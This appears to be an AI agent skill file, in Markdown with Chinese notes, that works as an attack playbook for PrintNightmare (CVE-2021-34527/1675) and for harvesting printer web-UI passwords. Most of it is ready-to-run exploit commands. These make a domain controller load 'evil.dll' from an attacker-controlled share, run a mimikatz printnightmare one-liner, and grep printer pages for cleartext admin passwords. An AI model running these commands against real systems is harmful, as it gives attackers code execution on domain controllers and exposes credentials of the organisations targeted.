---
name: 'printnightmare-printer-leaks'
description: 'PrintNightmare CVE-2021-34527/1675 + Printer Web UI credential leaks + 打印任务密码提取'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## PrintNightmare + Printer Credential Leaks

### PrintNightmare (CVE-2021-34527 / CVE-2021-1675)
Print Spooler 服务 RCE + LPE。仍然在未打补丁的 Server 2019/2022 上有效。

#### 检测
```bash
# 检查 Print Spooler 是否运行
impacket-rpcdump.py @<DC_IP> | grep -A5 "MS-RPRN\|MS-PAR"
nxc smb <DC_IP> -u <user> -p <pass> -M spooler
```

#### 利用
```bash
# 本地提权 (CVE-2021-1675)
git clone https://github.com/cube0x0/CVE-2021-1675
python3 CVE-2021-1675.py <domain>/<user>:<pass>@<DC_IP> '\\<ATTACKER_IP>\share\evil.dll'

# RCE (CVE-2021-34527) — 需要低权域用户
git clone https://github.com/cube0x0/CVE-2021-34527
python3 CVE-2021-34527.py <domain>/<user>:<pass>@<DC_IP> '\\<ATTACKER_IP>\share\evil.dll'
```

mimikatz 方式:
```cmd
mimikatz.exe "privilege::debug" "misc::printnightmare /server:<DC> /library:\\<ATTACKER_IP>\share\evil.dll" "exit"
```

### Printer Credential Leaks
打印机 Web UI 的 HTML 源码中常包含被 mask 的 admin 密码：
```html
<input type="password" value="AdminPass123!">
```
查看页面源码即可看到明文。

打印机扫描/打印任务中也可能包含明文文档（员工入职文件含用户名+初始密码）。

#### 检测
```bash
# 枚举打印机
nmap -p 515,631,9100 <subnet>
# 检查 Web UI
curl http://<printer_ip>/
# 查看源码找密码
curl http://<printer_ip>/ | grep -i 'password\|pass\|pwd'
```
